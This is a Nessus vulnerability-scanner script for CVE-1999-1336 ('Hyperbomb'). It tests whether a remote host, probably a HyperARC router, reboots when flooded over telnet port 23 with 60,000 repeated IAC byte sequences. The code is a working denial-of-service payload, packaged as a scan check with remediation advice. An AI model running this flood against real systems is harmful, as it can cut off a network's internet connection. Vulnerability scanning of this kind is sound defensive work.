#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10108);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-1999-1336");
 name["english"] = "Hyperbomb";
 name["francais"] = "Hyperbomb";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to reboot the remote host (possibly an HyperARC router)
by sending it a high volume of IACs.

An attacker may use this flaw to shut down your internet connection.

Solution : add a telnet access list to your Hyperarc router. If the remote 
system is not an Hyperarc router, then contact your vendor for a patch
Risk factor : High";


 desc["francais"] = "
Il s'est avéré possible de faire rebooter
la machine distante (sans doute un routeur
HyperARC) en envoyant un grand volume de IACs.

Un pirate peut utiliser ce problème pour couper
votre connexion à internet.


Solution : ajoutez une liste d'accès à votre routeur
Hyperarc. Si le système distant n'est pas un routeur
alors contactez votre vendeur pour un patch.

Facteur de risque : Elevé.";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote host using the 'hyperbomb' attack";
 summary["francais"] = "Plante le serveur distant en utilisant l'attaque 'hyperbomb'";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(23);
 
 exit(0);
}

#
# The script code starts here
#

start_denial();
port = 23;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  data = raw_string(254, 36, 185);
  for(i=0;i<60000;i=i+1)
  {
   send(socket:soc, data:data, length:3);
  }
  close(soc);
 

 #
 # wait
 #
 sleep(5);

 alive = end_denial();
 if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(0);
                }
 }
}
